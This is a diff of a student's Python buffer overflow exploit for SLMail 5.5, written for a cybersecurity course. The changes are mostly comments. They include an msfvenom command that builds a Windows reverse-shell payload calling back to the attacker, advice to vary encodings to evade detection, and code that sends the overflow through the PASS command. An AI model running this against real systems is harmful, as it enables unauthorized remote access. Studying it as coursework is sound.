@@ -1,12 +1,12 @@
-# Programming For Cybersecurity course - Project
-# Subject: Development of a buffer overflow exploit based on a proof of concept exploit.
+#  Programming For Cybersecurity course - Project
+#  Subject: Development of a buffer overflow exploit based on a proof of concept exploit.
 #
-# Author: Tomasz
+#  Author: Tomasz / G00398835
 #
-# Next step is to genereta a shellcode which will be executed  by the victim machine. Kali linux will help us generate one.
-# It might be beneficial to play around with different encoding sessings to increase chances of evading detection
-#  Kali:    msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKING MACHINE IP> LPORT=443 -f c
-#
+#  During this step we will place a shellcode which will be executed by the victim machine. Kali linux will help us to generate one.
+#  It might be beneficial to play around with different encoding sessings to increase chances of evading detection
+#  Kali:    msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKING MACHINE IP> LPORT=443 -f c | msfencode -b "\x00\x0a\x0d"  - we exclude bad chars from STEP 4.
+#  The shellcode should initiate a reverse shell connection to the attacking machines.
 
 
 import sys
@@ -64,4 +64,4 @@ try:
     s.send('PASS ' + buffer + '\r\n')             # Send Password and buffer
     s.close()
 except:
-    print('There was a problem... please check if the server is vulnerable and SLMail 5.5 is running on the target.')
+    print('There was a problem! Please check your code and if the server is vulnerable and SLMail 5.5 is running on the target.')
